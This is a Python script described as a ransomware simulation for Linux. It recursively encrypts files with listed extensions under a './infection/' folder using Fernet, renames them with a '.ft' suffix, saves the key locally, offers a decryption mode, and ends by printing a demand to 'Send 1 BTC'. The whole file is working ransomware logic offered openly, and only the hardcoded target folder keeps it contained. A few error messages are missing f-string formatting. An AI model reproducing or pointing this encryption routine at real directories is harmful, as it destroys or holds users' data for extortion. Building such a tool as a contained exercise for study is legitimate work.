import argparse
import os
import sys

from cryptography.fernet import Fernet
from tqdm import tqdm
from colorama import Fore, Style


def check_extension(file_name):
    try:
        with open("extensions.txt", "r") as file:
            file_data = file.read()
    except FileNotFoundError:
        print("File 'extensions.txt' not found.")
        sys.exit(1)
    extensions = file_data.splitlines()
    if any(file_name.endswith(ext) for ext in extensions):
        return True
    else:
        return False


def encrypt_file(file_name, key, silent):
    """
    Encrypt a file given a key.
    """
    if check_extension(file_name):
        f = Fernet(key)
        try:
            with open(file_name, "rb") as file:
                file_data = file.read()
        except FileNotFoundError:
            print("Error: file '{file_name}' not found.")
            sys.exit(1)
        encrypted_data = f.encrypt(file_data)
        try:
            if file_name.endswith('.ft'):
                new_file_name = file_name
            else:
                new_file_name = file_name + '.ft'
            os.rename(file_name, new_file_name)
            if not silent:
                print(Fore.RED + f"Encrypting... {file_name}" + Style.RESET_ALL)
            with open(new_file_name, "wb") as file:
                file.write(encrypted_data)
        except FileNotFoundError:
            print("Error: file '{file_name}' not found.")
            sys.exit(1)
    else:
        print(Fore.YELLOW + f"The file {file_name} does not have a matching extension." + Style.RESET_ALL)


def generate_key():
    """
    Generate a key and save it into a file.
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key


def list_dir(base_dir, key, silent):
    try:
        with os.scandir(base_dir) as entries:
            for entry in entries:
                if entry.is_dir():
                    list_dir(entry.path, key, silent)
                else:
                    if base_dir.endswith('/'):
                        file_name = base_dir + entry.name
                    else:
                        file_name = base_dir + '/' + entry.name
                    encrypt_file(file_name, key, silent)
    except FileNotFoundError:
        print(f"Directory not found: '{base_dir}'")
        sys.exit(1)


def reverse_encryption(base_dir, silent):
    try:
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    except FileNotFoundError:
        print("Error: key file not found.")
        sys.exit(1)
    try:
        with os.scandir(base_dir) as entries:
            for entry in entries:
                if entry.is_dir():
                    reverse_encryption(entry.path, silent)
                else:
                    if base_dir.endswith('/'):
                        file_name = base_dir + entry.name
                    else:
                        file_name = base_dir + '/' + entry.name
                    if file_name.endswith('.ft'):
                        f = Fernet(key)
                        try:
                            with open(file_name, "rb") as file:
                                file_data = file.read()
                        except FileNotFoundError:
                            print(f"Error: file '{file_name}' not found.")
                            sys.exit(1)
                        decrypted_data = f.decrypt(file_data)
                        if not silent:
                            print(Fore.GREEN + f"Decrypting... {file_name}" + Style.RESET_ALL)
                        new_file_name = file_name[:-3]
                        os.rename(file_name, new_file_name)
                        with open(new_file_name, "wb") as file:
                            file.write(decrypted_data)
    except FileNotFoundError:
        print(f"Directory not found: '{base_dir}'")
        sys.exit(1)


if __name__ == '__main__':
    base_dir = './infection/'
    parser = argparse.ArgumentParser(
    description='A ransomware simulation tool developed for the Linux platform.',
    )
    parser.add_argument(
            '-v', '--version',
            action='version',
            version='%(prog)s 1.0',
            help='Show the version of the program.'
    )
    parser.add_argument(
            '-r', '--reverse',
            metavar='KEY',
            type=str,
            help='Reverse the encryption process using the provided key.'
    )
    parser.add_argument(
            '-s', '--silent',
            action='store_true',
            help='Run the program in silent mode without displaying the names of the encrypted files.'
    )
    args = parser.parse_args()
    if args.reverse:
        reverse_encryption(base_dir, args.silent)
        sys.exit(0)
    key = generate_key()
    list_dir(base_dir, key, args.silent)
    if not args.silent:
        print(Fore.RED + "\nEncryption completed! Your files are now encrypted." + Style.RESET_ALL)
        print(Fore.RED + "Send 1 BTC to the following address to decrypt your files:" + Style.RESET_ALL)
        print(Fore.BLUE + f"Key: {key.decode()}" + Style.RESET_ALL)
